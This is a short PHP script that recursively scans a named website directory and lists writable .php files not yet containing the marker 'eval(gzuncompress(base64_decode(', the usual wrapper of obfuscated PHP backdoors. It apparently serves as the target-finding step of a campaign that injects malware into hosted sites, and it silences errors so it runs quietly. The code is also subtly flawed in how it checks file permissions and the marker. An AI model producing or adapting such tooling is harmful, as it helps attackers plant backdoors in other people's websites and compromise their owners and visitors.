<?php
error_reporting(0);
function GetListFiles($folder,&$all_files){
    $fp=opendir($folder);
    
    while($cv_file=readdir($fp)) {
        if(is_file($folder."/".$cv_file)) {
		if(is_writable($cv_file))

{$x = file_get_contents($folder."/".$cv_file);
if(strpos($x, "eval(gzuncompress(base64_decode(") == false)
{
if(strpos($cv_file, ".php") !== false)
{
            $all_files[]=$folder."/".$cv_file."*";
			}}}
        }elseif($cv_file!="." && $cv_file!=".." && is_dir($folder."/".$cv_file)){
            GetListFiles($folder."/".$cv_file,$all_files);
        }
    }
    closedir($fp);
}
$all_files=array();
GetListFiles("/var/www/sparta_all/data/www/test.kulikova24.ru/",$all_files);
$result = array_unique($all_files);
print_r($result);
?>
